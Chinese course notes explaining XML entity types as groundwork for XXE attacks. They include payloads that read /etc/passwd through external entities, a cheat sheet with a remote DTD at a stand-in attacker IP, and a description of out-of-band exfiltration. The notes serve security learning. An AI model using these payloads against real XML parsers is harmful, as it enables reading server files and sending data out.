---
title: XML 实体类型详解
category: XXE/基础
tags: [XML, 实体, 通用实体, 参数实体, 内部实体, 外部实体, 命名实体]
source: 课程笔记 2025-10-15
date: 2025-10-15
order: 2
---

## 一句话概括

**实体（Entity）就是对数据的引用** —— 你给它起个名字，用的时候写 `&名字;` 或者 `%名字;`，解析器就把名字换成它代表的内容。按「在哪用」分成通用实体 / 参数实体，按「值从哪来」分成内部实体 / 外部实体。**XXE 只依赖其中一个格子：外部实体。**

## 原理

### 1. 实体是干什么的

- 实体是对数据的引用。
- 使用实体可以**去掉符号的含义功能** —— 即把 `<`、`&` 这类「有语法含义的符号」变成一个纯数据的替身，避免解析器把它当语法处理。
- **实体格式**：除参数实体外，所有实体都以 `&` 开始、以 `;` 结束。

### 2. 命名实体（内部通用实体）

```xml
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE author [
    <!ELEMENT author (#PCDATA)>
    <!ENTITY writer "QIU">          <!-- 命名实体 writer，内容是 QIU -->
    <!ENTITY copyright "&#169;">    <!-- 命名实体 copyright，内容是版权符号 -->
]>
<author>&writer;&copyright;</author> <!-- 引用 -->
```

上面的例子定义了 `writer`、`copyright` 两个实体，在 `<author>` 里用 `&writer;&copyright;` 引用，解析后内容变成 `QIU©`。

> `&#169;` 是**字符引用**（数字实体），`&#x…;` 是十六进制写法，属于 XML 内置的引用方式，不需要 DTD 声明。

### 3. 元素与实体不是一回事

初学者最容易混：`<author>` 是**元素**，`&copyright;` 是**实体**。

| 方面 | 元素 (Element) | 实体 (Entity) |
|---|---|---|
| **作用** | 定义文档结构 | 定义可重用数据 |
| **语法** | `<tag>内容</tag>` | `&实体名;` |
| **DTD 声明** | `<!ELEMENT>` | `<!ENTITY>` |
| **内容** | 可以是文本、子元素等 | 只能是文本或外部资源 |

### 4. 实体可以引用实体（可迭代调用）

实体的值里可以再放实体引用，解析器会**递归展开**：

```xml
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE author [
    <!-- (#PCDATA)：表示这个元素包含可解析的字符数据——
         可以包含文本内容，不能包含其他子元素，可以包含实体引用 -->
    <!ELEMENT author (#PCDATA)>
    <!ENTITY writer "QIU">
    <!ENTITY copyright "&writer;&#169;">
]>
<author>&copyright;</author>
```

`&copyright;` → 展开成 `&writer;&#169;` → 再展开成 `QIU©`。

**这个「递归展开」的特性是 XXE 做盲注外带（OOB）的基础**：先把文件内容放进一个参数实体，再把它的值拼进另一个实体的 URL 里，让解析器替你把数据发出去。

### 5. 参数实体：给 DTD 自己用的「变量」

如果每个元素的内容模型都写一遍，DTD 会非常啰嗦：

```xml
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE author [
    <!ELEMENT residence (name, street, pincode, city, phone)>
    <!ELEMENT apartment (name, street, pincode, city, phone)>
    <!ELEMENT office    (name, street, pincode, city, phone)>
    <!ELEMENT shop      (name, street, pincode, city, phone)>
]>
<author></author>
```

用**参数实体**（以 `%` 开头，只能在 DTD 内部使用）可以把重复的部分抽出来：

```xml
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE author [
    <!ENTITY % area "name, street, pincode, city">

    <!ELEMENT residence (%area;)>
    <!ELEMENT apartment (%area;)>
    <!ELEMENT office    (%area;)>
    <!ELEMENT shop      (%area;)>
]>
```

> **原笔记结论：上面这个我用不起。**
> 说明：参数实体在 `<!ELEMENT>` 的内容模型里展开，对解析器实现有一定要求，部分 PHP/libxml 环境确实不生效。如果只是想在 XXE 里用参数实体，稳定做法是**把参数实体放进外部 DTD 文件**（`SYSTEM "http://…/1.dtd"`）再在内部子集里引用，这一点在后面的 XXE 篇会用上。

### 6. 完整分类：一张表看清所有实体

| 分类维度 | 类型 | 写法 | 在哪引用 | 值从哪来 |
|---|---|---|---|---|
| 按引用符号 | **通用实体**（General） | `&name;` | XML 文档主体 / DTD | 字面量或外部资源 |
| 按引用符号 | **参数实体**（Parameter） | `%name;` | **只能在 DTD 内部** | 字面量或外部资源 |
| 按值来源 | **内部实体**（Internal） | `<!ENTITY x "值">` | — | 直接写在声明里的字面量 |
| 按值来源 | **外部实体**（External） | `<!ENTITY x SYSTEM "URI">` | — | **由 SYSTEM/PUBLIC 指向的外部资源** ← XXE 用的就是它 |

两个维度是可以叠加的：

```xml
<!DOCTYPE root [
    <!ENTITY  readme  SYSTEM "file:///etc/passwd">            <!-- 外部 + 通用 -->
    <!ENTITY % readme SYSTEM "file:///etc/passwd">            <!-- 外部 + 参数 -->
    <!ENTITY  name    "QIU">                                  <!-- 内部 + 通用 -->
]>
```

**为什么内部实体打不出 XXE？** 因为 `<!ENTITY name "QIU">` 的值是你自己写的字面量，解析器不需要去任何地方「取」东西；只有 `SYSTEM`/`PUBLIC` 形式的**外部实体**，才会让解析器主动发起一次资源读取 —— 这才有攻击面。

## 利用条件

在 XXE 语境下，能用的组合只有一个：

1. 实体必须是**外部实体**（带 `SYSTEM` 或 `PUBLIC`）
2. 引用形式决定「数据怎么流出来」：
   - **通用实体** `&xxe;` → 值直接落在文档节点里，适合**有回显**的场景
   - **参数实体** `%xxe;` → 只能在 DTD 内使用，适合**拼进外部 DTD / 外带 URL**，是无回显场景的主力
3. 解析器要允许加载外部实体（PHP < 8.0 默认允许）
4. 目标协议要可用（`file://`、`http://`、`php://filter`、`expect://` 等，取决于环境）

## Payload 速查

| 目的 | 写法 |
|---|---|
| 内部通用实体 | `<!ENTITY name "值">` + `&name;` |
| 外部通用实体（读文件） | `<!ENTITY xxe SYSTEM "file:///etc/passwd">` + `&xxe;` |
| 字符引用 | `&#169;` / `&#xA9;` |
| 声明参数实体 | `<!ENTITY % area "a, b, c">` |
| 引用参数实体 | `%area;`（**只能在 DTD 内**） |
| 外部参数实体（远程 DTD） | `<!ENTITY % remote SYSTEM "http://攻击者IP/1.dtd">` + `%remote;` |
| 实体嵌套引用 | `<!ENTITY a "&b;&#169;">` |

## 完整示例

一份同时演示「内部实体 / 外部实体 / 参数实体」的文档：

```xml
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE root [
    <!ELEMENT root (a,b)>
    <!ELEMENT a (#PCDATA)>
    <!ELEMENT b (#PCDATA)>

    <!ENTITY inside "我是写死在声明里的字面量">              <!-- 内部实体 -->
    <!ENTITY outside SYSTEM "file:///etc/hostname">          <!-- 外部实体 -->
    <!ENTITY % area "a, b">                                  <!-- 参数实体 -->
]>
<root>
    <a>&inside;</a>    <!-- 展开成：我是写死在声明里的字面量 -->
    <b>&outside;</b>   <!-- 展开成：/etc/hostname 的内容 -->
</root>
```

## 踩坑与备注

- **原笔记结论保留**：「上面这个我用不起」—— 参数实体用在 `<!ELEMENT>` 内容模型里，在用户的实验环境（PHP + libxml）中未生效。改用外部 DTD 承载参数实体是通用解法。
- **参数实体只能用 `%` 引用，且只能在 DTD 内部引用**：在 XML 主体里写 `%area;` 会被当成普通文本，不会展开。
- **通用实体与参数实体的命名可以重名**（`&x;` 和 `%x;` 是两个不同的表），但为了可读性别这么干。
- **`#PCDATA` 不是「不能放实体」**：它恰恰允许实体引用（`&amp;` 就是最典型的），所以外部实体的内容可以顺利落进这类节点。
- **内部实体不能打 XXE**：只有 `SYSTEM` / `PUBLIC` 的外部实体才会触发资源读取。
